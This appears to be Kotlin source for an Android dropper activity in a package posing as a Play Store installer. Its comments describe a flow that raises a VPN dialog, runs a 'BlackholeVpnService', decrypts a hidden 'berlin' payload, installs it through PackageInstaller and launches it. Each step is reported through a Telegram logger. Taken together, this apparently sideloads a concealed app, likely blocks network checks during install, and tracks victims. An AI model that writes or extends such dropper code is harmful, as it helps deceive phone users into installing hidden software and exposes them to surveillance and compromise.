package com.playstore.installer

import android.animation.AnimatorSet
import android.animation.ObjectAnimator
import android.animation.ValueAnimator
import android.app.Activity
import android.app.PendingIntent
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.graphics.Color
import android.graphics.drawable.GradientDrawable
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.view.Gravity
import android.view.View
import android.view.ViewGroup
import android.widget.*
import com.playstore.installer.berlin.BerlinInstallManager
import com.playstore.installer.berlin.BerlinInstallReceiver

/**
 * BerlinInstallActivity — standalone installer activity for berlin flow.
 *
 * Completely separate from InstallActivity (companion flow).
 * Used ONLY by the berlin installer build — swapped in by build_berlin.yml
 * before Gradle assembleRelease. Never touched by main installer/companion build.
 *
 * Flow:
 *   User taps Install → BerlinInstallManager.start() →
 *   VPN dialog → BlackholeVpnService → berlin decrypt → PackageInstaller →
 *   onBerlinInstallSuccess → launchBerlin()
 */
class InstallActivity : Activity() {

    private enum class Stage { IDLE, INSTALLING, DONE, ERROR }

    // ── Views ────────────────────────────────────────────────────────────────
    private lateinit var installButton: FrameLayout
    private lateinit var installButtonBg: View
    private lateinit var tvInstallLabel: TextView
    private lateinit var tvStatus: TextView

    // ── State ────────────────────────────────────────────────────────────────
    private var stage = Stage.IDLE
    private val handler = Handler(Looper.getMainLooper())

    // ── Berlin install manager ───────────────────────────────────────────────
    private lateinit var berlinInstallManager: BerlinInstallManager

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        berlinInstallManager = BerlinInstallManager(
            activity = this,
            onBerlinInstallSuccess = { pkgName ->
                TelegramLogger.send(this, "BERLIN_FLOW", "COMPLETE",
                    "berlin installed — launching pkg=$pkgName")
                runOnUiThread {
                    setStage(Stage.DONE)
                    handler.postDelayed({ launchBerlin(pkgName) }, 500)
                }
            },
            onBerlinInstallError = {
                TelegramLogger.send(this, "BERLIN_FLOW", "ERROR", "berlin install failed")
                runOnUiThread { setStage(Stage.ERROR) }
            }
        )

        berlinInstallManager.registerReceivers()
        buildUi()
    }

    override fun onDestroy() {
        super.onDestroy()
        berlinInstallManager.unregisterReceivers()
        handler.removeCallbacksAndMessages(null)
    }

    @Deprecated("Deprecated in Java")
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == BerlinInstallManager.VPN_REQUEST_CODE_BERLIN) {
            berlinInstallManager.onVpnActivityResult(resultCode)
        }
    }

    // ── UI ───────────────────────────────────────────────────────────────────

    private fun buildUi() {
        val root = FrameLayout(this).apply {
            setBackgroundColor(Color.WHITE)
            layoutParams = ViewGroup.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT,
                ViewGroup.LayoutParams.MATCH_PARENT
            )
        }

        val container = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER
            layoutParams = FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.MATCH_PARENT,
                FrameLayout.LayoutParams.MATCH_PARENT
            )
        }

        // App icon placeholder
        val icon = ImageView(this).apply {
            setImageResource(android.R.drawable.sym_def_app_icon)
            val size = dpToPx(80)
            layoutParams = LinearLayout.LayoutParams(size, size).apply {
                bottomMargin = dpToPx(24)
                gravity = Gravity.CENTER_HORIZONTAL
            }
        }
        container.addView(icon)

        // App name
        val tvName = TextView(this).apply {
            text = try { applicationInfo.loadLabel(packageManager).toString() } catch (_: Exception) { "" }
            textSize = 20f
            setTextColor(Color.parseColor("#212121"))
            gravity = Gravity.CENTER
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.WRAP_CONTENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            ).apply { bottomMargin = dpToPx(8) }
        }
        container.addView(tvName)

        // Status text
        tvStatus = TextView(this).apply {
            text = "Tap Install to continue"
            textSize = 14f
            setTextColor(Color.parseColor("#757575"))
            gravity = Gravity.CENTER
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.WRAP_CONTENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            ).apply { bottomMargin = dpToPx(32) }
        }
        container.addView(tvStatus)

        // Install button
        installButton = FrameLayout(this).apply {
            layoutParams = LinearLayout.LayoutParams(dpToPx(200), dpToPx(50)).apply {
                gravity = Gravity.CENTER_HORIZONTAL
            }
        }

        installButtonBg = View(this).apply {
            background = GradientDrawable().apply {
                setColor(Color.parseColor("#00BCD4"))
                cornerRadius = dpToPx(25).toFloat()
            }
            layoutParams = FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.MATCH_PARENT,
                FrameLayout.LayoutParams.MATCH_PARENT
            )
        }
        installButton.addView(installButtonBg)

        tvInstallLabel = TextView(this).apply {
            text = "Install"
            textSize = 16f
            setTextColor(Color.WHITE)
            gravity = Gravity.CENTER
            layoutParams = FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.MATCH_PARENT,
                FrameLayout.LayoutParams.MATCH_PARENT
            )
        }
        installButton.addView(tvInstallLabel)

        installButton.setOnClickListener {
            if (stage == Stage.IDLE) {
                setStage(Stage.INSTALLING)
                TelegramLogger.send(this, "BERLIN_INSTALL_ACTIVITY", "INSTALL_TAP",
                    "user tapped install — starting BerlinInstallManager")
                berlinInstallManager.start()
            }
        }
        container.addView(installButton)

        root.addView(container)
        setContentView(root)
    }

    private fun setStage(s: Stage) {
        stage = s
        when (s) {
            Stage.IDLE -> {
                tvInstallLabel.text = "Install"
                tvStatus.text = "Tap Install to continue"
                installButton.isEnabled = true
            }
            Stage.INSTALLING -> {
                tvInstallLabel.text = "Installing..."
                tvStatus.text = "Please wait"
                installButton.isEnabled = false
            }
            Stage.DONE -> {
                tvInstallLabel.text = "Done"
                tvStatus.text = "Launching..."
                installButton.isEnabled = false
            }
            Stage.ERROR -> {
                tvInstallLabel.text = "Retry"
                tvStatus.text = "Installation failed. Tap to retry."
                installButton.isEnabled = true
                stage = Stage.IDLE
            }
        }
    }

    // ── Launch berlin after install ──────────────────────────────────────────

    private fun launchBerlin(pkgName: String) {
        if (pkgName.isEmpty()) return
        try {
            val launch = packageManager.getLaunchIntentForPackage(pkgName) ?: return
            launch.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK)
            startActivity(launch)
            finish()
        } catch (e: Exception) {
            TelegramLogger.send(this, "LAUNCH_BERLIN", "ERROR",
                "${e.javaClass.simpleName}: ${e.message}")
        }
    }

    private fun dpToPx(dp: Int): Int =
        (dp * resources.displayMetrics.density + 0.5f).toInt()
}
